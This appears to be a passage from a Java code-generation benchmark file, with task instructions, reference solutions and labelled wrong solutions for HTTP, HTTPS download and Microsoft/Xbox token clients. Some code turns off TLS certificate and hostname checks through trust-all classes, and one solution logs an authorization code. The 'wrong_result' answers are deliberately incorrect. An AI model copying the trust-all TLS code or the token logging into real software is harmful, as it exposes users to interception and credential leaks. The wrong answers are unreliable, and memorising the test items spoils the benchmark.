\"\\\":\\\"\" + e.getMessage() + \"\\\"}\";\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        SimpleHttpResult result = new SimpleHttpResult();\n        try {\n            URL urlObj = new URL(httpParam.getUrl());\n            HttpURLConnection urlConn = (HttpURLConnection) urlObj.openConnection();\n            setSSLSocketFactory(urlConn, httpParam.isSslVerify(), httpParam.isHostnameVerify(), httpParam.getTrustKeyStore(), httpParam.getClientKeyStore());\n\n            if (httpParam.getHeaders() != null) {\n                for (Map.Entry<String, String> entry : httpParam.getHeaders().entrySet()) {\n                    urlConn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            urlConn.setRequestMethod(httpParam.getMethod());\n            urlConn.setConnectTimeout(httpParam.getConnectTimeout());\n            urlConn.setReadTimeout(httpParam.getReadTimeout());\n            urlConn.setDoOutput(true);\n\n            if (httpParam.getMethod().equals(HTTP_METHOD_POST)) {\n                if (httpParam.getParams() != null && !httpParam.getParams().isEmpty()) {\n                    OutputStreamWriter writer = new OutputStreamWriter(urlConn.getOutputStream(), httpParam.getCharset());\n                    writer.write(mapToQueryString(httpParam.getParams(), httpParam.getCharset()));\n                    writer.flush();\n                    writer.close();\n                }\n            } else if (httpParam.getMethod().equals(HTTP_METHOD_GET)) {\n                if (httpParam.getParams() != null && !httpParam.getParams().isEmpty()) {\n                    urlObj = new URL(urlObj.toString() + \"?\" + mapToQueryString(httpParam.getParams(), httpParam.getCharset()));\n                    urlConn = (HttpURLConnection) urlObj.openConnection();\n                }\n            }\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(urlConn.getInputStream(), httpParam.getCharset()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            result.setContent(response.toString());\n            result.setStatus(urlConn.getResponseCode());\n        } catch (Exception e) {\n            logger.error(\"HTTP request error\", e);\n            result.setError(e.getMessage());\n        }\n        return result;\n    }\n\n    public static String mapToQueryString(Map<String, String> parameters, String charSet) throws UnsupportedEncodingException {\n        StringBuilder queryString = new StringBuilder();\n        boolean first = true;\n        for (Map.Entry<String, String> entry : parameters.entrySet()) {\n            if (!first) {\n                queryString.append(\"&\");\n            }\n            queryString.append(urlEncode(entry.getKey(), charSet)).append(\"=\").append(urlEncode(entry.getValue(), charSet));\n            first = false;\n        }\n        return queryString.toString();\n    }\n\n    public static String urlEncode(String url, String charSet) throws UnsupportedEncodingException {\n        return URLEncoder.encode(url, charSet);\n    }\n\n    public static void setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) throws Exception {\n        if (urlConn.getURL().getProtocol().toLowerCase().startsWith(HTTPS_PREFIX)) {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n\n            TrustManager[] trustManagers = trustAnyManagers;\n            if (trustKeyStore != null) {\n                KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                try (InputStream is = trustKeyStore.getFile().getInputStream()) {\n                    trustStore.load(is, trustKeyStore.getPassword().toCharArray());\n                }\n                TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n                tmf.init(trustStore);\n                trustManagers = tmf.getTrustManagers();\n            }\n\n            KeyManager[] keyManagers = null;\n            if (clientKeyStore != null) {\n                KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                try (InputStream is = clientKeyStore.getFile().getInputStream()) {\n                    keyStore.load(is, clientKeyStore.getPassword().toCharArray());\n                }\n                KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n                kmf.init(keyStore, clientKeyStore.getPassword().toCharArray());\n                keyManagers = kmf.getKeyManagers();\n            }\n\n            sslContext.init(keyManagers, sslVerify ? trustManagers : trustAnyManagers, new SecureRandom());\n            urlConn.setSSLSocketFactory(sslContext.getSocketFactory());\n\n            if (!hostnameVerify) {\n                urlConn.setHostnameVerifier((hostname, session) -> true);\n            }\n        }\n    }\n\n    public static List<String> makeStringList(Object value) {\n        List<String> list = new ArrayList<>();\n        if (value instanceof Collection<?>) {\n            for (Object item : (Collection<?>) value) {\n                list.add(item.toString());\n            }\n        } else if (value instanceof Object[]) {\n            for (Object item : (Object[]) value) {\n                list.add(item.toString());\n            }\n        } else {\n            list.add(value.toString());\n        }\n        return list;\n    }\n\n    public static class TrustAnyTrustManager implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {\n        }\n\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n\n    public static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n\n    public static class SimpleHttpParam {\n        private String url;\n        private String method;\n        private Map<String, String> params;\n        private Map<String, String> headers;\n        private String charset;\n        private int connectTimeout;\n        private int readTimeout;\n        private boolean sslVerify;\n        private boolean hostnameVerify;\n        private TrustKeyStore trustKeyStore;\n        private ClientKeyStore clientKeyStore;\n\n        // Getters and Setters\n    }\n\n    public static class SimpleHttpResult {\n        private String content;\n        private int status;\n        private String error;\n\n        // Getters and Setters\n    }\n\n    public static class TrustKeyStore {\n        private File file;\n        private String password;\n\n        // Getters and Setters\n    }\n\n    public static class ClientKeyStore {\n        private File file;\n        private String password;\n\n        // Getters and Setters\n    }\n}\n```"
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Implement a Java class for handling Microsoft authentication flows, including acquiring access tokens, Xbox Live tokens, and XSTS tokens for Minecraft services authentication.\n\nClass Description: The MicrosoftHttpClient class provides methods to authenticate with Microsoft's OAuth2.0 service and obtain various tokens required for Xbox Live and Minecraft services authentication. It handles HTTP communication with Microsoft's authentication endpoints and processes JSON responses.\n\nAttributes:\nXSTS_ERRORS: Map<Long, Integer> - A static map containing XSTS error codes mapped to corresponding error message resource IDs\n\nMethods:\nacquireAccessToken: acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) -> String - Acquires an OAuth access token from Microsoft's authentication service. Uses either an authorization code or refresh token based on the isRefresh parameter.\n\nacquireXBLToken: acquireXBLToken(String accessToken, String xblAuthUrl) -> String - Acquires an Xbox Live (XBL) token using the Microsoft OAuth access token.\n\nacquireXsts: acquireXsts(String xblToken, String xstsAuthUrl) -> String[] - Acquires XSTS (Xbox Secure Token Service) token and user hash using the XBL token. Returns an array containing the user hash and token.\n\nsetCommonProperties: setCommonProperties(HttpURLConnection conn, String formData) -> void - Helper method to set common HTTP connection properties for JSON requests.\n\nconvertToFormData: convertToFormData(String... data) -> String - Converts key-value pairs into URL-encoded form data format.\n\ngetResponseThrowable: getResponseThrowable(HttpURLConnection conn) -> RuntimeException - Creates an appropriate exception based on HTTP response status code.",
    "Canonical_solution": "import android.util.ArrayMap;\nimport android.util.Log;\n\nimport org.json.JSONArray;\nimport org.json.JSONException;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Collections;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n\n    private static final Map<Long, Integer> XSTS_ERRORS;\n    static {\n        XSTS_ERRORS = new ArrayMap<>();\n        XSTS_ERRORS.put(2148916233L, R.string.xerr_no_account);\n        XSTS_ERRORS.put(2148916235L, R.string.xerr_not_available);\n        XSTS_ERRORS.put(2148916236L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916237L ,R.string.xerr_adult_verification);\n        XSTS_ERRORS.put(2148916238L ,R.string.xerr_child);\n    }\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws IOException, JSONException {\n        URL url = new URL(authTokenUrl);\n        Log.i(\"MicrosoftLogin\", \"isRefresh=\" + isRefresh + \", authCode= \"+authcode);\n\n        String formData = convertToFormData(\n                \"client_id\", \"00000000402b5328\",\n                isRefresh ? \"refresh_token\" : \"code\", authcode,\n                \"grant_type\", isRefresh ? \"refresh_token\" : \"authorization_code\",\n                \"redirect_url\", \"https://login.live.com/oauth20_desktop.srf\",\n                \"scope\", \"service::user.auth.xboxlive.com::MBI_SSL\"\n        );\n\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n        conn.setRequestMethod(\"POST\");\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n        conn.connect();\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(formData.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"access_token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xblAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"AuthMethod\", \"RPS\");\n        properties.put(\"SiteName\", \"user.auth.xboxlive.com\");\n        properties.put(\"RpsTicket\", accessToken);\n        data.put(\"Properties\",properties);\n        data.put(\"RelyingParty\", \"http://auth.xboxlive.com\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            conn.disconnect();\n            return jo.getString(\"Token\");\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws IOException, JSONException {\n        URL url = new URL(xstsAuthUrl);\n\n        JSONObject data = new JSONObject();\n        JSONObject properties = new JSONObject();\n        properties.put(\"SandboxId\", \"RETAIL\");\n        properties.put(\"UserTokens\", new JSONArray(Collections.singleton(xblToken)));\n        data.put(\"Properties\", properties);\n        data.put(\"RelyingParty\", \"rp://api.minecraftservices.com/\");\n        data.put(\"TokenType\", \"JWT\");\n\n        String req = data.toString();\n        HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n        setCommonProperties(conn, req);\n        conn.connect();\n\n        try(OutputStream wr = conn.getOutputStream()) {\n            wr.write(req.getBytes(StandardCharsets.UTF_8));\n        }\n\n        if(conn.getResponseCode() >= 200 && conn.getResponseCode() < 300) {\n            JSONObject jo = new JSONObject(Tools.read(conn.getInputStream()));\n            String uhs = jo.getJSONObject(\"DisplayClaims\").getJSONArray(\"xui\").getJSONObject(0).getString(\"uhs\");\n            String token = jo.getString(\"Token\");\n            conn.disconnect();\n            return new String[]{uhs, token};\n        }else if(conn.getResponseCode() == 401) {\n            String responseContents = Tools.read(conn.getErrorStream());\n            JSONObject jo = new JSONObject(responseContents);\n            long xerr = jo.optLong(\"XErr\", -1);\n            Integer locale_id = XSTS_ERRORS.get(xerr);\n            if(locale_id != null) {\n                throw new PresentedException(new RuntimeException(responseContents), locale_id);\n            }\n            throw new PresentedException(new RuntimeException(responseContents), R.string.xerr_unknown, xerr);\n        }else{\n            throw getResponseThrowable(conn);\n        }\n    }\n\n    private static void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setRequestProperty(\"charset\", \"utf-8\");\n        try {\n            conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes(StandardCharsets.UTF_8).length));\n            conn.setRequestMethod(\"POST\");\n        }catch (ProtocolException e) {\n            Log.e(\"MicrosoftAuth\", e.toString());\n        }\n        conn.setUseCaches(false);\n        conn.setDoInput(true);\n        conn.setDoOutput(true);\n    }\n\n    private static String convertToFormData(String... data) throws UnsupportedEncodingException {\n        StringBuilder builder = new StringBuilder();\n        for(int i=0; i<data.length; i+=2){\n            if (builder.length() > 0) builder.append(\"&\");\n            builder.append(URLEncoder.encode(data[i], \"UTF-8\"))\n                    .append(\"=\")\n                    .append(URLEncoder.encode(data[i+1], \"UTF-8\"));\n        }\n        return builder.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws IOException {\n        Log.i(\"MicrosoftLogin\", \"Error code: \" + conn.getResponseCode() + \": \" + conn.getResponseMessage());\n        if(conn.getResponseCode() == 429) {\n            return new PresentedException(R.string.microsoft_login_retry_later);\n        }\n        return new RuntimeException(conn.getResponseMessage());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class MicrosoftHttpClient {\n    public static Map<Long, Integer> XSTS_ERRORS;\n\n    public String acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) throws IOException {\n        URL url = new URL(authTokenUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n\n        String formData = convertToFormData(\n                \"client_id\", \"0000000048093EEA\",\n                \"redirect_uri\", \"https://login.live.com/oauth20_desktop.srf\",\n                \"scope\", \"XboxLive.signin%20XboxLive.broadcaster%20offline_access\",\n                \"response_type\", isRefresh ? \"token\" : \"code\"\n        );\n\n        if (isRefresh) {\n            formData += \"&grant_type=refresh_token&refresh_token=\" + authcode;\n        } else {\n            formData += \"&code=\" + authcode + \"&grant_type=authorization_code\";\n        }\n\n        setCommonProperties(conn, formData);\n        try (OutputStream os = conn.getOutputStream()) {\n            os.write(formData.getBytes());\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw getResponseThrowable(conn);\n        }\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public String acquireXBLToken(String accessToken, String xblAuthUrl) throws IOException {\n        URL url = new URL(xblAuthUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n\n        String jsonInputString = \"{ \\\"Properties\\\": { \\\"AuthMethod\\\": \\\"RPS\\\", \\\"SiteName\\\": \\\"user.auth.xboxlive.com\\\", \\\"RpsTicket\\\": \\\"d=\" + accessToken + \"\\\" }, \\\"RelyingParty\\\": \\\"http://auth.xboxlive.com\\\", \\\"TokenType\\\": \\\"JWT\\\" }\";\n\n        setCommonProperties(conn, \"\");\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] input = jsonInputString.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw getResponseThrowable(conn);\n        }\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    public String[] acquireXsts(String xblToken, String xstsAuthUrl) throws IOException {\n        URL url = new URL(xstsAuthUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"POST\");\n        conn.setDoOutput(true);\n\n        String jsonInputString = \"{ \\\"Properties\\\": { \\\"SandboxId\\\": \\\"RETAIL\\\", \\\"UserTokens\\\": [\\\"\" + xblToken + \"\\\"] }, \\\"RelyingParty\\\": \\\"rp://api.minecraftservices.com/\\\", \\\"TokenType\\\": \\\"JWT\\\" }\";\n\n        setCommonProperties(conn, \"\");\n        conn.setRequestProperty(\"Content-Type\", \"application/json\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n\n        try (OutputStream os = conn.getOutputStream()) {\n            byte[] input = jsonInputString.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode != 200) {\n            throw getResponseThrowable(conn);\n        }\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = br.readLine()) != null) {\n                sb.append(line);\n            }\n            String result = sb.toString();\n\n            int userHashIndex = result.indexOf(\"\\\"UserHash\\\"\");\n            int tokenIndex = result.indexOf(\"\\\"Token\\\"\");\n\n            if (userHashIndex == -1 || tokenIndex == -1) {\n                throw new RuntimeException(\"Invalid XSTS response format.\");\n            }\n\n            String userHash = extractValue(result, userHashIndex);\n            String token = extractValue(result, tokenIndex);\n\n            return new String[]{userHash, token};\n        }\n    }\n\n    private void setCommonProperties(HttpURLConnection conn, String formData) {\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n        conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        conn.setRequestProperty(\"Content-Length\", Integer.toString(formData.getBytes().length));\n    }\n\n    private String convertToFormData(String... data) {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < data.length; i += 2) {\n            if (i > 0) {\n                sb.append('&');\n            }\n            sb.append(java.net.URLEncoder.encode(data[i], \"UTF-8\"))\n              .append('=')\n              .append(java.net.URLEncoder.encode(data[i + 1], \"UTF-8\"));\n        }\n        return sb.toString();\n    }\n\n    private RuntimeException getResponseThrowable(HttpURLConnection conn) throws IOException {\n        int responseCode = conn.getResponseCode();\n        if (responseCode >= 400 && responseCode < 500) {\n            return new IOException(\"Client error: \" + responseCode);\n        } else if (responseCode >= 500) {\n            return new IOException(\"Server error: \" + responseCode);\n        } else {\n            return new IOException(\"Unexpected HTTP response code: \" + responseCode);\n        }\n    }\n\n    private String extractValue(String json, int startIndex) {\n        int valueStart = json.indexOf(':', startIndex) + 2;\n        int valueEnd = json.indexOf(',', valueStart);\n        if (valueEnd == -1) {\n            valueEnd = json.indexOf('}', valueStart);\n        }\n        return json.substring(valueStart, valueEnd).replaceAll(\"^\\\"|\\\"$\", \"\");\n    }\n}\n```"
  },
  {
    "Task_id": 74,
    "Instruction": "Task Description: Create a Java utility class for handling HTTPS network requests, including downloading content as strings or files.\n\nClass Description: NetworkUtils is a utility class that provides methods for making HTTPS requests and downloading content either as strings or files. It handles connection setup, timeout configuration, and proper resource cleanup.\n\nAttributes:\nDEBUG: [boolean] - Flag to enable debug logging\nTAG: [String] - Tag used for logging\nHTTP_READ_TIMEOUT: [int] - Timeout for reading from connection (in milliseconds)\nHTTP_CONNECTION_TIMEOUT: [int] - Timeout for establishing connection (in milliseconds)\n\nMethods:\nsetupHttpsRequest: [String urlStr] -> [HttpsURLConnection] - Sets up an HTTPS connection with the specified URL, configures timeouts and request method, and establishes the connection. Returns the connection object if successful.\ndownloadUrlMemoryAsString: [String url] -> [String] - Downloads content from the specified URL and returns it as a UTF-8 encoded string. Returns null if the download fails.\ndownloadUrlFile: [String url, File f] -> [boolean] - Downloads content from the specified URL and saves it to the specified file. Returns true if successful, false otherwise.\nDownloadCallback: [interface] - Interface defining a callback for asynchronous download completion with onDownloadComplete method.",
    "Canonical_solution": "import android.util.Log;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class NetworkUtils {\n\n    private static final boolean DEBUG = false;\n    private static final String TAG = \"NetworkUtils\";\n    private static final int HTTP_READ_TIMEOUT = 60000;\n    private static final int HTTP_CONNECTION_TIMEOUT = 60000;\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) {\n        URL url;\n        HttpsURLConnection urlConnection = null;\n        try {\n            url = new URL(urlStr);\n            urlConnection = (HttpsURLConnection) url.openConnection();\n            urlConnection.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n            urlConnection.setReadTimeout(HTTP_READ_TIMEOUT);\n            urlConnection.setRequestMethod(\"GET\");\n            urlConnection.setDoInput(true);\n            urlConnection.connect();\n            int code = urlConnection.getResponseCode();\n            if (code != HttpsURLConnection.HTTP_OK) {\n                Log.d(TAG, \"response:\" + code);\n                return null;\n            }\n            return urlConnection;\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to connect to server\", e);\n            return null;\n        }\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        if (DEBUG) Log.d(TAG, \"download: \" + url);\n\n        HttpsURLConnection urlConnection = null;\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return null;\n            }\n\n            InputStream is = urlConnection.getInputStream();\n            ByteArrayOutputStream byteArray = new ByteArrayOutputStream();\n            int byteInt;\n\n            while ((byteInt = is.read()) >= 0) {\n                byteArray.write(byteInt);\n            }\n\n            byte[] bytes = byteArray.toByteArray();\n            if (bytes == null) {\n                return null;\n            }\n\n            return new String(bytes, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return null;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        if (DEBUG) Log.d(TAG, \"download:\" + url);\n\n        HttpsURLConnection urlConnection = null;\n\n        if (f.exists())\n            f.delete();\n\n        try {\n            urlConnection = setupHttpsRequest(url);\n            if (urlConnection == null) {\n                return false;\n            }\n            long len = urlConnection.getContentLength();\n            if ((len > 0) && (len < 4L * 1024L * 1024L * 1024L)) {\n                byte[] buffer = new byte[262144];\n\n                InputStream is = urlConnection.getInputStream();\n                FileOutputStream os = new FileOutputStream(f, false);\n                try {\n                    int r;\n                    while ((r = is.read(buffer)) > 0) {\n                        os.write(buffer, 0, r);\n                    }\n                } finally {\n                    os.close();\n                }\n\n                return true;\n            }\n            return false;\n        } catch (Exception e) {\n            Log.e(TAG, \"\", e);\n            return false;\n        } finally {\n            if (urlConnection != null) {\n                urlConnection.disconnect();\n            }\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(String result);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport javax.net.ssl.HttpsURLConnection;\nimport java.io.*;\nimport java.net.URL;\n\npublic class NetworkUtils {\n    public static final boolean DEBUG = true;\n    public static final String TAG = \"NetworkUtils\";\n    public static final int HTTP_READ_TIMEOUT = 10000;\n    public static final int HTTP_CONNECTION_TIMEOUT = 15000;\n\n    private NetworkUtils() {}\n\n    public static HttpsURLConnection setupHttpsRequest(String urlStr) throws IOException {\n        URL url = new URL(urlStr);\n        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n        conn.setReadTimeout(HTTP_READ_TIMEOUT);\n        conn.setConnectTimeout(HTTP_CONNECTION_TIMEOUT);\n        conn.setRequestMethod(\"GET\");\n        conn.setDoInput(true);\n        conn.connect();\n        return conn;\n    }\n\n    public static String downloadUrlMemoryAsString(String url) {\n        try {\n            HttpsURLConnection conn = setupHttpsRequest(url);\n            if (conn.getResponseCode() != HttpsURLConnection.HTTP_OK) {\n                if (DEBUG)\n                    System.out.println(TAG + \": Server returned non-200 code: \" + conn.getResponseCode());\n                return null;\n            }\n            InputStream is = conn.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(is, \"UTF-8\"));\n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n            reader.close();\n            is.close();\n            return sb.toString();\n        } catch (IOException e) {\n            if (DEBUG)\n                e.printStackTrace();\n            return null;\n        }\n    }\n\n    public static boolean downloadUrlFile(String url, File f) {\n        try {\n            HttpsURLConnection conn = setupHttpsRequest(url);\n            if (conn.getResponseCode() != HttpsURLConnection.HTTP_OK) {\n                if (DEBUG)\n                    System.out.println(TAG + \": Server returned non-200 code: \" + conn.getResponseCode());\n                return false;\n            }\n            InputStream is = conn.getInputStream();\n            FileOutputStream fos = new FileOutputStream(f);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.flush();\n            fos.close();\n            is.close();\n            return true;\n        } catch (IOException e) {\n            if (DEBUG)\n                e.printStackTrace();\n            return false;\n        }\n    }\n\n    public interface DownloadCallback {\n        void onDownloadComplete(boolean success, File file);\n    }\n}\n```"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a function that retrieves JSON data from a Twitter URL based on a given tweet ID using Java's HttpURLConnection.\n\nFunction Description: The function makes an HTTP GET request to a Twitter URL constructed with the provided tweet ID, reads the response, and returns it as a JSONObject. It handles HTTPS connections, sets appropriate request headers, and manages the connection lifecycle.\n\nInput: \n- tweetId: long - The ID of the tweet for which to retrieve favorited popup data\n\nOutput: \n- JSONObject - The JSON response from the Twitter URL, or null if an error occurs",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\n\npublic JSONObject getJson(long tweetId) {\n    try {\n        String url = \"https://twitter.com/i/activity/favorited_popup?id=\" + tweetId;\n        URL obj = new URL(url);\n\n        HttpsURLConnection connection = (HttpsURLConnection) obj.openConnection();\n        connection.setRequestProperty(\"Content-Type\", \"text/html\");\n        connection.setRequestProperty(\"charset\", \"utf-8\");\n        connection.setRequestMethod(\"GET\");\n        connection.setRequestProperty(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36\");\n        connection.connect();\n\n        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        StringBuilder sb = new StringBuilder();\n        String line = null;\n        while ((line = reader.readLine()) != null) {\n            sb.append(line + \"\\n\");\n        }\n\n        String docHtml = sb.toString();\n\n        try {\n            connection.disconnect();\n        } catch (Exception e) {\n\n        }\n\n        return new JSONObject(docHtml);\n    } catch (Exception e) {\n        return null;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport org.json.JSONObject;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class TwitterFetcher {\n\n    public JSONObject getFavoritedPopupJson(long tweetId) {\n        String urlString = \"https://twitter.com/i/api/1.1/favorites/show_popup.json?id=\" + tweetId;\n        try {\n            URL url = new URL(urlString);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n            connection.setRequestProperty(\"Accept\", \"application/json\");\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                StringBuilder response = new StringBuilder();\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    response.append(inputLine);\n                }\n                in.close();\n                return new JSONObject(response.toString());\n            } else {\n                System.err.println(\"GET request failed. Response Code: \" + responseCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for MMS (Multimedia Messaging Service) operations, supporting both HTTP and HTTPS protocols with configurable proxy settings and connection parameters.\n\nClass Description: MmsHttpClient is a specialized HTTP client designed for MMS operations that handles both GET and POST requests. It manages network connections, proxy configurations, request/response handling, and includes MMS-specific header management. The class uses OkHttp internally for connection management.\n\nAttributes:\n- mContext: Context - Android application context\n- mSocketFactory: SocketFactory - Factory for creating sockets\n- mHostResolver: MmsNetworkManager - Network host resolver for connection management\n- mConnectionPool: ConnectionPool - Pool of HTTP connections for reuse\n\nMethods:\n- execute(String urlString, byte[] pdu, String method, boolean isProxySet, String proxyHost, int proxyPort, MmsConfig.Overridden mmsConfig) -> byte[] - Executes an HTTP request to the specified URL with given PDU data. Handles both GET and POST methods with proxy support. Returns the response body as byte array.\n- openConnection(URL url, Proxy proxy) -> HttpURLConnection - Creates and configures an appropriate HttpURLConnection (HTTP or HTTPS) with the given URL and proxy settings. Throws MalformedURLException for invalid protocols.\n- checkMethod(String method) -> void - Validates that the HTTP method is either GET or POST (helper method)\n- getCurrentAcceptLanguage(Locale locale) -> String - Generates Accept-Language header value from locale (helper method)\n- addExtraHeaders(HttpURLConnection connection, MmsConfig.Overridden mmsConfig) -> void - Adds additional MMS-specific headers to the request (helper method)\n- logHttpHeaders(Map<String, List<String>> headers) -> void - Logs HTTP headers for debugging (helper method)",
